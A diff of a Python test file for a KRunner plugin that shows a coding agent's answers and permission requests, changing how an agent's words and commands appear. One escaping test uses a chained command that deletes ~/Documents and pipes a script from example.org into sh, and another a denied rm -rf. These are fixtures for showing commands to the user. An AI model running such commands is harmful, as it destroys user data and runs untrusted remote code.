@@ -61,6 +61,9 @@ class FakeOpencode:
 
     attach = kortex.Opencode.attach  # the real command, with this fake's url and password
 
+    def start(self):
+        pass
+
     def check(self):
         if self.fail:
             raise kortex.AgentError(self.fail)
@@ -108,6 +111,7 @@ class FakeOpencode:
 class FakeDesktop:
     def __init__(self):
         self.queries, self.copied, self.launched, self.notes = [], [], [], []
+        self.docked = []
         self.still = None  # whether the last refresh is still wanted when it goes out
 
     def query(self, t, still=None):
@@ -122,6 +126,10 @@ class FakeDesktop:
 
     def launch(self, command, env):
         self.launched.append((command, env))
+        return 4242
+
+    def dock(self, pid):
+        self.docked.append(pid)
 
     def notify(self, summary, body, replaces=0, transient=False, then=None):
         self.notes.append((summary, body, replaces, transient))
@@ -289,9 +297,12 @@ class Answer(unittest.TestCase):
                          "failed on the request (HTTP 500)")
         self.assertEqual(kortex.failure(ValueError("bad json"), 10), "sent an answer kortex cannot read")
 
-    def test_steps_on_one_line(self):
-        self.assertEqual(kortex.steps_summary(["bash ls", "read /etc/x", "bash df -h"]), "3 steps: bash ×2, read")
-        self.assertEqual(kortex.steps_summary(["webfetch https://example.org"]), "1 step: webfetch")
+    def test_what_the_agent_does_in_words(self):
+        self.assertEqual(kortex.doing([user("x"), assistant(text("Looking."), tool("bash", "running", command="ls"))]),
+                         "running a command")
+        self.assertEqual(kortex.doing([user("x"), assistant(tool("tracker_list_issues"))]), "using tracker")
+        self.assertEqual(kortex.doing([user("x"), assistant(tool("bash"), text("Found it."))]), "")
+        self.assertEqual(kortex.doing([user("x"), assistant(tool("bash", "pending"))]), "")  # being written
 
 
 def busy(*parts, permissions=(), error=None):
@@ -304,13 +315,34 @@ class View(unittest.TestCase):
         state = busy(text("Switching."), permissions=[PERMISSION])
         matches = kortex.view(state, None, "opencode")
         self.assertEqual([m[0] for m in matches], ["permission" + SEP + "per_1", "answer"])
-        # PERMISSION has no `always`; what the agent said last stands beside what it asks
-        self.assertEqual(matches[0][1], "Allow bash: patina theme mode light<br>The agent: Switching.")
+        # PERMISSION has no `always`; the agent's words first, and since patina is among
+        # RISKY, the command under them
+        self.assertEqual(matches[0][1], "Allow: Switching.<br>patina theme mode light")
         self.assertEqual(matches[0][4]["actions"], ["allow-once", "allow-always", "deny"])
         self.assertTrue(matches[0][4]["multiline"])  # a long command is shown whole
         self.assertEqual(matches[1][1], "Waiting for your answer · Shift+Enter allows once")  # holds still to be clicked
         self.assertFalse(matches[1][4]["multiline"])
         self.assertEqual(matches[1][4]["subtext"], "opencode")  # short: KRunner cuts a long one in its middle
+
+    def test_a_row_in_the_agents_words(self):
+        safe = dict(PERMISSION, patterns=["apt-cache policy firefox-esr"], metadata={"command": "apt-cache policy firefox-esr"})
+        state = busy(text("I'll check which Firefox version is installed."), permissions=[safe])
+        self.assertEqual(kortex.view(state)[0][1], "Allow: I'll check which Firefox version is installed.")
+        state = busy(text("Checking."), tool("bash", command="ls"), permissions=[safe])  # nothing said since
+        self.assertEqual(kortex.view(state)[0][1], "Allow bash: apt-cache policy firefox-esr")
+        root = dict(safe, patterns=["sudo -A apt install x"], metadata={"command": "sudo -A apt install x"})
+        state = busy(text("I'll install x."), permissions=[root])
+        self.assertEqual(kortex.view(state)[0][1], "Allow: I'll install x.<br>sudo -A apt install x")
+        edit = {"id": "per_2", "sessionID": "ses_1", "permission": "edit", "patterns": ["/home/u/.bashrc"],
+                "metadata": {"filepath": "/home/u/.bashrc", "diff": "+alias ll='ls -l'"}, "always": []}
+        state = busy(text("I'll add the alias."), permissions=[edit])
+        self.assertEqual(kortex.view(state)[0][1], "Allow: I'll add the alias.")
+        # opencode names the call: the words right before that step
+        called = dict(safe, tool={"callID": "c2"})
+        first = dict(tool("bash", command="ls"), callID="c1")
+        second = dict(tool("bash", "running", command="apt-cache policy firefox-esr"), callID="c2")
+        state = busy(text("Looking."), first, text("Now the version."), second, permissions=[called])
+        self.assertEqual(kortex.view(state)[0][1], "Allow: Now the version.")
 
     def test_the_whole_command_shows_as_written(self):
         # opencode cuts a command at `;`, `|` and `&&` for its patterns; KRunner reads a
@@ -321,9 +353,8 @@ class View(unittest.TestCase):
         state = {"messages": [user("x"), assistant(text("a < b\nand b > c"))], "status": ("idle", ""),
                  "permissions": [asked]}
         shown = kortex.view(state)
-        self.assertEqual(shown[0][1], "Allow bash: true &lt;x ; rm -rf ~/Documents ; "
-                                      "curl -s https://example.org/x.sh | sh &amp;&amp; echo &amp;amp;"
-                                      "<br>The agent: a &lt; b and b &gt; c")
+        self.assertEqual(shown[0][1], "Allow: a &lt; b and b &gt; c<br>true &lt;x ; rm -rf ~/Documents ; "
+                                      "curl -s https://example.org/x.sh | sh &amp;&amp; echo &amp;amp;")
         self.assertEqual(shown[1][1], "a &lt; b<br>and b &gt; c")
 
     def test_always_says_what_it_lets_through(self):
@@ -428,7 +459,6 @@ class View(unittest.TestCase):
         self.assertEqual(kortex.tool_line(tool("cloud_list_notes")), "cloud_list_notes")
         long = kortex.tool_line(tool("cloud_create_note", title="t", content="x" * 300))
         self.assertTrue(len(long) < 125 and long.endswith("…"), long)
-        self.assertEqual(kortex.steps_summary([kortex.tool_line(step)] * 2), "2 steps: tracker_update_issue ×2")
 
     def test_a_denied_step_does_not_end_in_done(self):
         # opencode ends the turn when a step is denied; the palette said "Done.", or
@@ -436,9 +466,9 @@ class View(unittest.TestCase):
         no = tool("bash", "error", command="rm -rf ~/Downloads/.cache")
         no["state"]["error"] = "The user rejected permission to use this specific tool call."
         state = {"messages": [user("clean up"), assistant(no)], "status": ("idle", ""), "permissions": []}
-        answer, steps = kortex.view(state)
+        [answer] = kortex.view(state)
         self.assertEqual(answer[1], kortex.DENIED)
-        self.assertEqual(steps[1], "1 step: bash")
+        self.assertEqual(answer[4]["subtext"], "Enter copies · 1 step")
         self.assertEqual(kortex.tool_line(no), "bash rm -rf ~/Downloads/.cache (denied)")
         state["messages"] = [user("clean up"), assistant(text("I will delete the cache."), no)]
         self.assertEqual(kortex.view(state)[0][1], "I will delete the cache.<br>" + kortex.DENIED)
@@ -464,45 +494,35 @@ class View(unittest.TestCase):
         self.assertEqual(kortex.retry_message({"type": "busy"}), "")
         self.assertEqual(kortex.retry_message({"type": "retry", "message": "x", "next": "soon"}), "x")
 
-    def test_a_row_per_step_while_the_agent_works(self):
+    def test_no_step_rows_while_the_agent_works(self):
+        # a chat: the commands are the panel's (Show what the agent does)
         state = busy(text("Looking."), tool("bash", command="apt-cache search claude"), tool("read", filePath="/etc/x"))
         matches = kortex.view(state, 9)
-        self.assertEqual([m[0] for m in matches], ["answer", "step" + SEP + "0", "step" + SEP + "1"])
-        self.assertEqual(matches[0][1], "Working · 9 s")  # a step was the last thing it did
-        self.assertEqual([m[1] for m in matches[1:]], ["bash apt-cache search claude", "read /etc/x"])
-        self.assertEqual(matches[1][2], "utilities-terminal")
-        self.assertGreater(matches[1][3], matches[2][3])  # in the order taken
-        self.assertFalse(any(m[4]["multiline"] for m in matches))  # every row one line: the window holds still
-
-    def test_older_steps_fold_into_one_row(self):
-        state = busy(*[tool("bash", command=f"step {i}") for i in range(6)])
-        matches = kortex.view(state, 30)
-        self.assertEqual([m[1] for m in matches[1:]], ["+3 earlier steps", "bash step 3", "bash step 4", "bash step 5"])
-        self.assertEqual(len(matches), 1 + kortex.MAX_STEPS)
-        self.assertEqual([m[0] for m in matches[2:]], ["step" + SEP + str(i) for i in (3, 4, 5)])
+        self.assertEqual([m[0] for m in matches], ["answer"])
+        self.assertEqual(matches[0][1], "Working · 9 s · reading a file")  # a step was the last thing it did
+        self.assertIn("terminal", matches[0][4]["actions"])
+        self.assertFalse(matches[0][4]["multiline"])  # one line: the window holds still
 
     def test_done_the_answer_and_its_steps_on_one_row(self):
         state = busy(text("Looking."), tool("bash", command="df -h"), tool("bash", command="du -sh ~"),
                      text("Your disk is full of <caches>."))
         state["status"] = ("idle", "")
         matches = kortex.view(state)
-        self.assertEqual([m[0] for m in matches], ["answer", "step" + SEP + "all"])
+        self.assertEqual([m[0] for m in matches], ["answer"])
         # what it said after its last step: "Looking." is how it got there
         self.assertEqual(matches[0][1], "Your disk is full of &lt;caches&gt;.")
-        self.assertEqual(matches[0][4]["subtext"], "Enter copies")
-        self.assertEqual(matches[1][1], "2 steps: bash ×2")
-        self.assertFalse(matches[1][4]["multiline"])
+        self.assertEqual(matches[0][4]["subtext"], "Enter copies · 2 steps")
 
     def test_done_with_steps_alone(self):
         state = busy(tool("bash", command="patina theme mode light"))
         state["status"] = ("idle", "")
-        self.assertEqual([m[1] for m in kortex.view(state)], ["Done.", "1 step: bash"])
+        self.assertEqual([m[1] for m in kortex.view(state)], ["Done."])
 
     def test_the_agent_stopped(self):
         state = busy(tool("bash", command="ls"), error={"name": "APIError", "data": {"message": "rate limited"}})
         state["status"] = ("idle", "")
         matches = kortex.view(state)
-        self.assertEqual([(m[0], m[1]) for m in matches], [("answer", "rate limited"), ("step" + SEP + "all", "1 step: bash")])
+        self.assertEqual([(m[0], m[1]) for m in matches], [("answer", "rate limited")])
 
     def test_long_answer_keeps_the_start(self):
         # It kept the end: a list of seven tickets began at the sixth.
@@ -672,11 +692,27 @@ class Runner(unittest.TestCase):
         k.run("answer", "")
         self.assertEqual(desk.copied, ["the answer"])
         with mock.patch.object(kortex, "find_opencode", return_value="/usr/bin/opencode"):
-            k.run("answer", "terminal")
+            k.run("answer", "terminal")  # Show what the agent does
         command, env = desk.launched[0]
         self.assertEqual(command, ["konsole", "-e", "/usr/bin/opencode", "attach", oc.url, "--session", "ses_1"])
         self.assertEqual(env, {"OPENCODE_SERVER_PASSWORD": "secret"})
         self.assertNotIn("secret", command)
+        self.assertEqual(desk.docked, [4242])  # the terminal's window goes to the right edge
+
+    def test_the_panel_without_a_conversation(self):
+        oc = kortex.Opencode("http://127.0.0.1:4096", "secret")
+        with mock.patch.object(kortex, "find_opencode", return_value="/usr/bin/opencode"), \
+                mock.patch.object(oc, "start"):
+            self.assertEqual(oc.attach(None)[0], ["/usr/bin/opencode", "attach", "http://127.0.0.1:4096"])
+        hermes = kortex.Hermes.from_environment()
+        with mock.patch.object(kortex, "find_hermes", return_value="/usr/bin/hermes"):
+            self.assertEqual(hermes.attach(None)[0], ["/usr/bin/hermes"])
+            self.assertEqual(hermes.attach("s1")[0], ["/usr/bin/hermes", "--resume", "s1"])
+        k, oc, desk, _ = new()
+        with mock.patch.object(kortex, "find_opencode", return_value="/usr/bin/opencode"):
+            k.panel()  # Meta+Shift+A before any request
+        self.assertEqual(desk.launched[0][0], ["konsole", "-e", "/usr/bin/opencode", "attach", oc.url])
+        self.assertEqual(desk.docked, [4242])
 
     def test_list(self):
         k, *_ = new()
